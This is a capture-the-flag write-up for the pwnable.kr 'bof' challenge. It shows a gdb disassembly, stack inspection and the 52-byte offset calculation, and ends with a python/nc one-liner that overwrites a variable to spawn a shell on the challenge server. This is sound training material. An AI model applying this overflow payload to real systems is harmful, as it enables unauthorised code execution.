## Description

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof

Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

## Solution

In this challenge we should provide the value **0xcafebabe** for **key** variable to spawn a shell, but this variable is not normally in our control.
when we look at the **fucn()** code we see the **gets()** function is used as input function for **overflowme** variable and this is where we should smash the stack :)

I open the program with **gdb** debugger and disassemble the **func()** function.

```
(gdb) disass func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e3b590 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e3ab40 <gets>
=> 0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7e10620 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e3b590 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7edd4e0 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
End of assembler dump.
```
We set a memory breakpoint on the comparison instruction line.
```
(gdb) break *0x56555654
 Breakpoint 1 at 0x56555654
```
We run the program again with **"AAAA"** as input.
```
(gdb) r                                     
Starting program: /path/of/program
overflow me :                               
AAAA        

Breakpoint 1, 0x56555654 in func ()
```
We can see the stack with the following command.
```
(gdb) x/22xw $esp
0xffffd0f0:     0xffffd10c      0xffffd1f4      0xf7fac000      0xf7faaa80
0xffffd100:     0x00000000      0xf7fac000      0xf7ffc800      0x41414141
0xffffd110:     0x56556f00      0xf7fac000      0x00000001      0x5655549d
0xffffd120:     0xf7fac3fc      0x00040000      0x56556ff4      0xb82ae100
0xffffd130:     0x56556ff4      0xf7fac000      0xffffd158      0x5655569f
0xffffd140:     0xdeadbeef      0x00000000
```
we know the **func()** is initialized with 0xdeadbeef value and it's the current value of the **key** variable. we also know the value of **overflowme** variable (0x41414141). so when we calculate how many A (0x41) characters we should enter to override the **key** variable and write **0xcafebabe** into its address. 
so when we calculate the space between the **overflowme** variable and **key** variable we find that we need to enter 52 bytes (character) to start overriding the **key** variable. the payload to solve the challenge is **A&ast;52+0xcafebabe** but we type 0xcafebabe in reverse order because the system is little endian. the following command exploits the bof and gives you the shell to print the flag.
```
(python -c "print 'A'*52+'\xbe\xba\xfe\xca'" && cat) | nc pwnable.kr 9000
```

run the python code to get the flag. :)
